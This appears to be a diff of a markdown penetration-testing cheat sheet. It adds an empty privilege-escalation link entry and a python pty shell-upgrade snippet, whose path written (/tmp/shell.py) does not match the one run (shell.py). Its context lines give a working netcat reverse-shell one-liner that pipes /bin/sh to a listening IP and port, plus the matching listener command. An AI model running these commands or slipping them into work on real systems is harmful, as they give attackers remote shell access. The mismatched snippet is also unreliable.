@@ -3,6 +3,7 @@
 ## Enumerating
 ### Linux
 * LinEnum: https://github.com/rebootuser/LinEnum
+* linprivesc: 
 
 ## Steganography
 ### MP3
@@ -29,3 +30,9 @@
 ### 2 - S: nc ; C: nc
 * Server: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTENING-IP LISTENING-PORT >/tmp/f
 * Client: nc -nlvp LISTENING-PORT
+
+## Decent shell:
+```
+$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
+$ python shell.py
+```
